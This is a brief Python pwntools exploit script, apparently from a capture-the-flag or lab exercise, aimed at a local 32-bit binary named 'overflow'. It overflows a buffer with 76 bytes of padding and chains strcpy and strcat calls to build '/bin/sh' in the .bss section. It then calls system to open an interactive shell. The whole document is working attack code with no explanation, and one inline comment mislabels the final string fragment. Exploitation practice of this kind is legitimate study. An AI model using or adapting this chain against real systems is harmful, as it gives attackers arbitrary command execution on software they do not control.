from pwn import *

binary = ELF("./overflow")

strcpy_plt = p32(binary.symbols["strcpy"])
strcat_plt = p32(binary.symbols["strcat"])
system_plt = p32(binary.symbols["system"])
bss = p32(binary.symbols["__bss_start"])
binsh1 = 0x804954e      # /b
binsh2 = 0x8049565      # in/
binsh3 = 0x80486ce      # sh
pop2ret = 0x80485da


x = ""
x += "A" * 76
x += strcpy_plt    # strcpy(&bss, &"/b" );
x += p32(pop2ret)
x += bss
x += p32(binsh1)
x += strcat_plt    # strcat(&bss, &"in/"); 
x += p32(pop2ret)
x += bss
x += p32(binsh2)
x += strcat_plt    # strcat(&bss, &"in/");
x += p32(pop2ret)
x += bss
x += p32(binsh3)
x += system_plt    # system(&bss)
x += "JUNK"
x += bss           # /bin/sh

p = process(["./overflow", x])
p.interactive()
